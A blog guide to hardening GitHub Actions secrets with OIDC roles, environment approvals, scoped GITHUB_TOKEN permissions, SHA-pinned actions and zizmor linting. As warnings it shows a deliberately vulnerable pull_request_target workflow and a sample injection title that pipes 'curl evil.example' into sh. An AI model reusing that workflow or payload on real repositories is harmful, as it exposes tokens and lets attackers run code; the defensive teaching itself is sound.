---
title: "GitHub Actions Secrets: OIDC, Environments, SHA Pins"
date: 2025-05-25T16:34:42-05:00
lastmod: 2026-10-23
draft: false
tags: ["GitHub Actions", "OIDC", "Secrets", "CI/CD Security", "AWS IAM", "Supply Chain", "zizmor"]
categories:
- "GitHub Actions"
- "Secret Management"
- DevSecOps
- "CI & CD"
author: "Matthew Mattox - mmattox@support.tools"
description: "Replace long-lived cloud keys with OIDC, gate deploy secrets behind environments, pin actions by SHA, lock down GITHUB_TOKEN and avoid pull_request_target traps."
more_link: "yes"
quick_fix: |
  Delete stored cloud keys and use OIDC: give the job `permissions: id-token: write`, call `aws-actions/configure-aws-credentials` with `role-to-assume`, and restrict the IAM trust policy `sub` to `repo:ORG/REPO:environment:production`.
  Set `permissions: {}` at the top of every workflow, grant per job, and pin every third-party action to a full commit SHA.
---

Most GitHub Actions secret leaks are not clever. A long-lived AWS key sits in repository secrets for three years, a `pull_request_target` workflow checks out a fork and runs its `npm install` with that key in the environment, or a tag on a popular action gets repointed to malicious code. This guide fixes each of those with concrete workflow YAML, in the order that removes the most risk first.

<!--more-->

Every workflow in this post passes [actionlint](https://github.com/rhysd/actionlint) and [zizmor](https://github.com/zizmorcore/zizmor) 1.31 with no findings. Action SHAs are the real commits for `actions/checkout` v7.0.1 and `aws-actions/configure-aws-credentials` v6.3.0 at the time of writing; resolve your own before copying.

## 1. Stop storing cloud credentials: use OIDC

A stored `AWS_SECRET_ACCESS_KEY` is valid until someone rotates it, works from anywhere, and leaks the moment any step prints it or any dependency exfiltrates the environment. With OpenID Connect, the job asks GitHub for a short-lived signed token describing *which repository, branch and environment* is running, and the cloud provider exchanges it for temporary credentials (one hour by default with `configure-aws-credentials`). There is nothing to store and nothing to rotate.

### AWS side: the identity provider and a narrow trust policy

Create the OIDC provider once per account (provider URL `https://token.actions.githubusercontent.com`, audience `sts.amazonaws.com`), then a role whose trust policy names exactly one repository and one environment:

```json {filename="trust-policy.json"}
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:acme/payments-api:environment:production"
        }
      }
    }
  ]
}
```

The `sub` condition is the whole security model. When a job runs in an environment the subject is `repo:ORG/REPO:environment:NAME`; for a branch push without an environment it is `repo:ORG/REPO:ref:refs/heads/BRANCH`. Never use `StringLike` with `repo:acme/*` or a bare `*`: that lets any repository in the org, or any pull request branch, assume your production role.

### Workflow side

```yaml {filename=".github/workflows/deploy.yml"}
name: deploy

on:
  push:
    branches: [main]

permissions: {}

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - run: make test

  deploy:
    needs: test
    runs-on: ubuntu-latest
    environment: production
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy-production
          aws-region: us-east-1
          role-session-name: gha-${{ github.run_id }}
      - run: aws sts get-caller-identity
      - run: ./scripts/deploy.sh
```

Only the `deploy` job gets `id-token: write`, so only it can mint an OIDC token. `role-session-name` puts the run ID into CloudTrail, which makes "which workflow run did this?" a one-query answer.

The same pattern exists for the other clouds: `google-github-actions/auth` with Workload Identity Federation on GCP, and `azure/login` with a federated credential on an Entra ID app registration. HashiCorp Vault's JWT auth method accepts the same token, which is the cleanest way to hand a job secrets that are not cloud credentials.

## 2. Put deploy secrets behind an environment

Secrets that must still exist (a third-party API key, a signing key) belong in an **environment**, not at the repository level. Environment secrets are only available to jobs that declare `environment: production`, and if the environment requires approval, the job cannot read them until a reviewer approves the run.

Configure under **Settings, Environments, production**:

- **Required reviewers:** up to six users or teams; one approval releases the job.
- **Prevent self-review:** the person who triggered the deployment cannot approve it. Turn this on, otherwise "required reviewer" means "click your own button".
- **Deployment branches and tags:** restrict to `main` (or protected branches). This stops a job on a feature branch from declaring `environment: production` and reading the secrets.
- **Wait timer:** optional delay of up to 43,200 minutes before the job starts.

Combined with the OIDC trust policy above, the production role can only be assumed from `main`, after review, by this one repository.

> [!NOTE]
> On private repositories, required reviewers and wait timers need GitHub Enterprise; GitHub Free, Pro and Team offer them only for public repositories. Deployment branch restrictions and environment secrets work on Pro and Team.

## 3. Least privilege for `GITHUB_TOKEN`

Every job gets a `GITHUB_TOKEN`. Its default scope comes from the repository or organization setting, which defaults to read only for organizations and accounts created since February 2023 but is still read and write in many older ones. Do not depend on the setting. Set `permissions: {}` at the workflow level, which removes every scope, and grant exactly what each job needs:

```yaml
permissions: {}

jobs:
  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write      # create the release
      packages: write      # push to ghcr.io
```

Once any `permissions` key is set, every scope you do not list is `none`. Also pass `persist-credentials: false` to `actions/checkout` unless a later step really needs to `git push`; otherwise the token is written to `.git/config` where any later step, or an uploaded artifact of the workspace, can read it. zizmor reports this as `artipacked`.

## 4. `pull_request_target`: the trigger that hands forks your secrets

`pull_request` workflows from forks run with a read-only token and **no secrets**, which is safe. `pull_request_target` runs in the context of the base repository: write token, full secrets, and the workflow file from the default branch. It exists so maintainers can label or comment on fork PRs. It becomes a remote code execution hole the moment it checks out and runs the PR's code:

```yaml
# DO NOT DO THIS
on:
  pull_request_target:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker-controlled code
      - run: npm ci && npm test                            # runs attacker's install scripts
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}              # ...with your token in the environment
```

An attacker opens a PR whose `package.json` has a `postinstall` script that sends `$NPM_TOKEN` somewhere. No review is needed for the workflow to run.

Rules:

1. If the job builds or tests PR code, use `pull_request`. It has no secrets by design.
2. If you need privileges (labels, comments), use `pull_request_target` **without** checking out the PR head, and treat every field of the event as untrusted input.
3. If you need both, split them: a `pull_request` workflow builds and uploads an artifact, and a separate `workflow_run` workflow with privileges consumes the artifact as data, never executing it.

A safe labeler looks like this:

```yaml {filename=".github/workflows/label.yml"}
name: label-pr

on:
  pull_request_target: # zizmor: ignore[dangerous-triggers] metadata only, no checkout
    types: [opened, synchronize]

permissions: {}

jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      # No checkout of the PR head: this job only reads event metadata.
      - name: Label by title
        env:
          TITLE: ${{ github.event.pull_request.title }}
          PR: ${{ github.event.pull_request.number }}
          GH_TOKEN: ${{ github.token }}
          GH_REPO: ${{ github.repository }}
        run: |
          case "$TITLE" in
            docs:*) gh pr edit "$PR" --add-label documentation ;;
          esac
```

Note `TITLE` goes through an environment variable. Writing `${{ github.event.pull_request.title }}` directly inside `run:` pastes the attacker's title into the shell script before it runs, so a title like `` a"; curl evil.example | sh; echo " `` executes. The same applies to branch names, commit messages, issue bodies and comment text.

## 5. Masking: what the log redaction does not catch

GitHub replaces the exact value of each secret used in a job with `***` in the logs. That protection is narrower than it looks:

- **Transformed values are not masked.** `echo "$TOKEN" | base64`, a URL-encoded copy, or a JWT signed with the secret all print in clear. Register derived values yourself:

  ```bash
  ENCODED=$(printf '%s' "$TOKEN" | base64 -w0)
  echo "::add-mask::$ENCODED"
  ```

- **Structured secrets mask as a whole, not per field.** A secret containing a JSON blob is redacted only when the entire blob appears. Once `jq -r .password` extracts one field, that field is not masked. GitHub's guidance is one secret per value.
- **Values you fetch at runtime are not secrets to the runner.** A password read from Vault or AWS Secrets Manager inside a step is unknown to the masker until you `::add-mask::` it, and you must do that before anything prints it.
- **Masking is not access control.** A step that can read a secret can send it anywhere over the network. Redaction protects logs from accidents, not from malicious code, which is why sections 1 and 4 matter more.

If an unmasked secret does reach a log, delete the run logs and rotate the secret. Deleting alone is not enough because forks, log forwarders and anyone who viewed the run may already have it.

## 6. Pin third-party actions to a commit SHA

`uses: some-org/some-action@v3` resolves the tag when the job starts. Whoever controls that repository, or whoever steals their credentials, can move `v3` to new code and it runs in your pipeline with your secrets. That is exactly what happened with `tj-actions/changed-files` in March 2025, when tags were repointed to a commit that dumped runner memory, secrets included, into public build logs.

Pin to the full 40-character commit SHA and keep the version as a comment:

```yaml
- uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
```

Resolve a tag to its commit without trusting a web page:

```bash
git ls-remote --tags https://github.com/aws-actions/configure-aws-credentials 'v6.3.0*'
# For annotated tags, use the line ending in ^{}: that is the commit the tag points to.
```

Then let Dependabot keep the pins current. It understands SHA pins and updates the trailing version comment along with the hash:

```yaml {filename=".github/dependabot.yml"}
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

Since August 2025 the allowed actions policy (organization, enterprise or repository settings) can require full-length SHA pins and fail any workflow that uses an unpinned action, and GitHub has workflow dependency lockfiles in public preview that pin transitive actions too; see [GitHub's lockfile documentation](https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles).

## 7. Catch secrets before they are committed

Turn on **secret scanning** and **push protection**. Push protection blocks a `git push` that contains a recognized credential pattern; a user with write access can bypass it with a reason, and each bypass raises an alert and an audit log entry. It is free on public repositories; private repositories need GitHub Secret Protection. Push protection for your personal account is on by default for pushes to public repositories.

## 8. Lint workflows in CI

Run [zizmor](https://github.com/zizmorcore/zizmor) on every PR that touches `.github/workflows/`. It catches the patterns in this post: `template-injection`, `dangerous-triggers`, `unpinned-uses`, `excessive-permissions` and `artipacked`.

```bash
pipx install zizmor
zizmor --offline .github/workflows/
```

Run against the unsafe `pull_request_target` example above, it reports:

```text
error[dangerous-triggers]: use of fundamentally insecure workflow trigger
error[template-injection]: code injection via template expansion
error[unpinned-uses]: unpinned action reference
warning[excessive-permissions]: overly broad permissions
help[artipacked]: credential persistence through GitHub Actions artifacts
```

A finding you have reviewed and accepted can be silenced inline with `# zizmor: ignore[rule-name]`, as on the labeler's trigger line.

## FAQ

### Are secrets available to pull requests from forks?

Not with the `pull_request` trigger: apart from a read-only `GITHUB_TOKEN`, secrets are not passed to workflows triggered by a fork PR. Dependabot PRs are treated the same way and only see Dependabot secrets. `pull_request_target` and `workflow_run` do get secrets, which is why they need the care described above.

### Should I use `secrets: inherit` for reusable workflows?

Only for workflows in the same organization that you control. It passes every secret the caller can see. Passing the specific secrets the reusable workflow declares is more work but shows reviewers exactly what crosses the boundary.

### Do self-hosted runners change any of this?

Yes, they raise the stakes. A job on a persistent self-hosted runner can leave files, processes or credentials behind for the next job. Never run fork pull requests on self-hosted runners in a public repository, and prefer ephemeral runners that are destroyed after one job.

### How do I find which workflows still use long-lived keys?

Search the org for `secrets.AWS_SECRET_ACCESS_KEY` and similar names, then check the IAM credential report for access keys with recent use from GitHub's IP ranges. Each one is a candidate for an OIDC role.

## Related guides

- [Advanced CI/CD Pipeline Security and Supply Chain Protection](/advanced-cicd-pipeline-security-supply-chain-protection/)
- [Advanced Secret Management with HashiCorp Vault and External Secrets](/advanced-secret-management-hashicorp-vault-external-secrets/)
- [GitHub Actions Cross-Repository Workflow Automation](/github-actions-cross-repository-workflow-automation-enterprise-guide/)
- [GitHub Actions Conditional Workflows with Dynamic Inputs](/post/github-actions-conditional-workflows-comprehensive-guide/)
